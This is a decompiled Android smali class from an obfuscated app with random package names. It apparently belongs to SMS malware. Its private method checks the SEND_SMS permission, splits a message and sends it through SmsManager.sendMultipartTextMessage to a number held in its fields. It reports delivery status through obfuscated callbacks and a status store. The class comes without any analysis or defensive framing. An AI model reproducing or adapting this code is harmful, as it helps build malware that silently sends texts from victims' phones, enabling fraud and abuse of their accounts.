.class public Lru/jdhndtpk/iypwqbmltdwdk/c/c$a;
.super Ljava/lang/Object;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lru/jdhndtpk/iypwqbmltdwdk/c/c;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x9
    name = "a"
.end annotation


# instance fields
.field public a:I

.field public b:Ljava/lang/String;

.field public c:Ljava/lang/String;

.field public d:I

.field public e:Ljava/lang/String;

.field public f:Lru/jdhndtpk/iypwqbmltdwdk/a/b$a;


# direct methods
.method public constructor <init>(ILjava/lang/String;Ljava/lang/String;)V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    iput p1, p0, Lru/jdhndtpk/iypwqbmltdwdk/c/c$a;->a:I

    iput-object p2, p0, Lru/jdhndtpk/iypwqbmltdwdk/c/c$a;->b:Ljava/lang/String;

    iput-object p3, p0, Lru/jdhndtpk/iypwqbmltdwdk/c/c$a;->c:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>(Ljava/lang/String;Ljava/lang/String;Lru/jdhndtpk/iypwqbmltdwdk/a/b$a;)V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    iput-object p1, p0, Lru/jdhndtpk/iypwqbmltdwdk/c/c$a;->b:Ljava/lang/String;

    iput-object p2, p0, Lru/jdhndtpk/iypwqbmltdwdk/c/c$a;->c:Ljava/lang/String;

    iput-object p3, p0, Lru/jdhndtpk/iypwqbmltdwdk/c/c$a;->f:Lru/jdhndtpk/iypwqbmltdwdk/a/b$a;

    return-void
.end method

.method private a()V
    .locals 10

    const/4 v2, 0x0

    const/4 v3, 0x1

    iget-object v0, p0, Lru/jdhndtpk/iypwqbmltdwdk/c/c$a;->c:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-ge v0, v3, :cond_0

    const-string v0, "PjjdFNWQLmgsJR"

    invoke-static {v0}, Lru/jdhndtpk/iypwqbmltdwdk/a;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lru/jdhndtpk/iypwqbmltdwdk/c/c$a;->a(Ljava/lang/String;)V

    :goto_0
    return-void

    :cond_0
    iget-object v0, p0, Lru/jdhndtpk/iypwqbmltdwdk/c/c$a;->b:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-ge v0, v3, :cond_1

    const-string v0, "nVpepfGyjZiZiJzWhzkHqzQLGLJ"

    invoke-static {v0}, Lru/jdhndtpk/iypwqbmltdwdk/a;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lru/jdhndtpk/iypwqbmltdwdk/c/c$a;->a(Ljava/lang/String;)V

    goto :goto_0

    :cond_1
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x17

    if-lt v0, v1, :cond_2

    invoke-static {}, Lru/jdhndtpk/iypwqbmltdwdk/YOytzTerr;->a()Landroid/content/Context;

    move-result-object v0

    const-string v1, "android.permission.SEND_SMS"

    invoke-virtual {v0, v1}, Landroid/content/Context;->checkSelfPermission(Ljava/lang/String;)I

    move-result v0

    if-eqz v0, :cond_2

    const-string v0, "SVFATKMOVORcqXiUZTVsItZxrT"

    invoke-static {v0}, Lru/jdhndtpk/iypwqbmltdwdk/a;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lru/jdhndtpk/iypwqbmltdwdk/c/c$a;->a(Ljava/lang/String;)V

    goto :goto_0

    :cond_2
    invoke-virtual {p0, v3}, Lru/jdhndtpk/iypwqbmltdwdk/c/c$a;->a(I)V

    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    iget-object v1, p0, Lru/jdhndtpk/iypwqbmltdwdk/c/c$a;->c:Ljava/lang/String;

    invoke-virtual {v0, v1}, Landroid/telephony/SmsManager;->divideMessage(Ljava/lang/String;)Ljava/util/ArrayList;

    move-result-object v3

    new-instance v4, Ljava/util/ArrayList;

    invoke-direct {v4}, Ljava/util/ArrayList;-><init>()V

    move v1, v2

    :goto_1
    invoke-virtual {v3}, Ljava/util/ArrayList;->size()I

    move-result v5

    if-ge v1, v5, :cond_3

    invoke-static {}, Lru/jdhndtpk/iypwqbmltdwdk/YOytzTerr;->a()Landroid/content/Context;

    move-result-object v5

    iget v6, p0, Lru/jdhndtpk/iypwqbmltdwdk/c/c$a;->a:I

    new-instance v7, Landroid/content/Intent;

    sget-object v8, Lru/jdhndtpk/iypwqbmltdwdk/c/c;->a:Ljava/lang/String;

    invoke-direct {v7, v8}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v8, "FobYVdzlePhRZmKWNmmeJrQSta"

    invoke-static {v8}, Lru/jdhndtpk/iypwqbmltdwdk/a;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    iget v9, p0, Lru/jdhndtpk/iypwqbmltdwdk/c/c$a;->a:I

    invoke-virtual {v7, v8, v9}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object v7

    invoke-static {v5, v6, v7, v2}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    add-int/lit8 v1, v1, 0x1

    goto :goto_1

    :cond_3
    :try_start_0
    iget-object v1, p0, Lru/jdhndtpk/iypwqbmltdwdk/c/c$a;->b:Ljava/lang/String;

    const/4 v2, 0x0

    const/4 v5, 0x0

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendMultipartTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/util/ArrayList;Ljava/util/ArrayList;Ljava/util/ArrayList;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lru/jdhndtpk/iypwqbmltdwdk/c/c$a;->a(Ljava/lang/String;)V

    iget v0, p0, Lru/jdhndtpk/iypwqbmltdwdk/c/c$a;->a:I

    invoke-static {v0}, Lru/jdhndtpk/iypwqbmltdwdk/c/c;->b(I)V

    goto/16 :goto_0
.end method

.method static synthetic a(Lru/jdhndtpk/iypwqbmltdwdk/c/c$a;)V
    .locals 0

    invoke-direct {p0}, Lru/jdhndtpk/iypwqbmltdwdk/c/c$a;->a()V

    return-void
.end method


# virtual methods
.method public a(I)V
    .locals 4

    iput p1, p0, Lru/jdhndtpk/iypwqbmltdwdk/c/c$a;->d:I

    iget-object v0, p0, Lru/jdhndtpk/iypwqbmltdwdk/c/c$a;->f:Lru/jdhndtpk/iypwqbmltdwdk/a/b$a;

    if-eqz v0, :cond_1

    iget v0, p0, Lru/jdhndtpk/iypwqbmltdwdk/c/c$a;->d:I

    const/4 v1, 0x1

    if-ne v0, v1, :cond_0

    :goto_0
    return-void

    :cond_0
    iget-object v0, p0, Lru/jdhndtpk/iypwqbmltdwdk/c/c$a;->f:Lru/jdhndtpk/iypwqbmltdwdk/a/b$a;

    iget v1, p0, Lru/jdhndtpk/iypwqbmltdwdk/c/c$a;->d:I

    invoke-virtual {v0, v1}, Lru/jdhndtpk/iypwqbmltdwdk/a/b$a;->a(I)V

    iget v0, p0, Lru/jdhndtpk/iypwqbmltdwdk/c/c$a;->a:I

    invoke-static {v0}, Lru/jdhndtpk/iypwqbmltdwdk/c/c;->b(I)V

    goto :goto_0

    :cond_1
    new-instance v0, Lru/jdhndtpk/iypwqbmltdwdk/b/c;

    invoke-static {}, Lru/jdhndtpk/iypwqbmltdwdk/YOytzTerr;->a()Landroid/content/Context;

    move-result-object v1

    invoke-direct {v0, v1}, Lru/jdhndtpk/iypwqbmltdwdk/b/c;-><init>(Landroid/content/Context;)V

    iget v1, p0, Lru/jdhndtpk/iypwqbmltdwdk/c/c$a;->a:I

    iget v2, p0, Lru/jdhndtpk/iypwqbmltdwdk/c/c$a;->d:I

    iget-object v3, p0, Lru/jdhndtpk/iypwqbmltdwdk/c/c$a;->e:Ljava/lang/String;

    invoke-virtual {v0, v1, v2, v3}, Lru/jdhndtpk/iypwqbmltdwdk/b/c;->a(IILjava/lang/String;)Lru/jdhndtpk/iypwqbmltdwdk/b/c$a;

    move-result-object v0

    invoke-static {}, Lru/jdhndtpk/iypwqbmltdwdk/a/d;->d()Lru/jdhndtpk/iypwqbmltdwdk/a/d;

    move-result-object v1

    invoke-virtual {v1, v0}, Lru/jdhndtpk/iypwqbmltdwdk/a/d;->a(Lru/jdhndtpk/iypwqbmltdwdk/b/c$a;)V

    goto :goto_0
.end method

.method public a(Ljava/lang/String;)V
    .locals 1

    iput-object p1, p0, Lru/jdhndtpk/iypwqbmltdwdk/c/c$a;->e:Ljava/lang/String;

    const/4 v0, 0x3

    invoke-virtual {p0, v0}, Lru/jdhndtpk/iypwqbmltdwdk/c/c$a;->a(I)V

    return-void
.end method
